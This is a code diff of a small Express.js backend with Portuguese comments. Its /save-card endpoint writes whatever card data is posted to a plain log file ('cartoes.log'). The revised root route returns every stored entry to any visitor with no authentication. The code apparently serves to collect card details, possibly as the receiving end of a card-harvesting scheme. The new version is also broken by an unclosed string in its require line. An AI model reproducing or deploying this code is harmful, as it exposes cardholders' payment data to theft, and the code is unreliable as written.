@@ -1,24 +1,24 @@
-// index.js
-const express = require('express');
-const cors = require('cors');
+// index.js do backend (Render)
+const express = require('express);
 const fs = require('fs');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+app.use(express.json({ limit: '2mb' }));
+
 const LOG_FILE = path.join(__dirname, 'cartoes.log');
 
-app.use(cors());
-app.use(express.json());
-
 app.post('/save-card', (req, res) => {
-  const payload = { ...req.body, timestamp: new Date().toISOString() };
-  fs.appendFile(LOG_FILE, JSON.stringify(payload) + '\n', (err) => {
-    if (err) return res.status(500).json({ status: 'error', message: err.message });
-    res.json({ status: 'ok' });
-  });
+  const payload = { ...req.body, ts: new Date().toISOString() };
+  fs.appendFileSync(LOG_FILE, JSON.stringify(payload) + '\n');
+  res.json({ ok: true });
 });
 
-app.get('/', (_, res) => res.send('OK'));
+app.get('/', (_req, res) => {
+  if (!fs.existsSync(LOG_FILE)) return res.send('--- nenhum cartão ainda ---');
+  const data = fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(Boolean).map(JSON.parse);
+  res.json(data);
+});
 
-app.listen(PORT, () => console.log(`Rodando em ${PORT}`));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log('Rodando na porta', PORT));
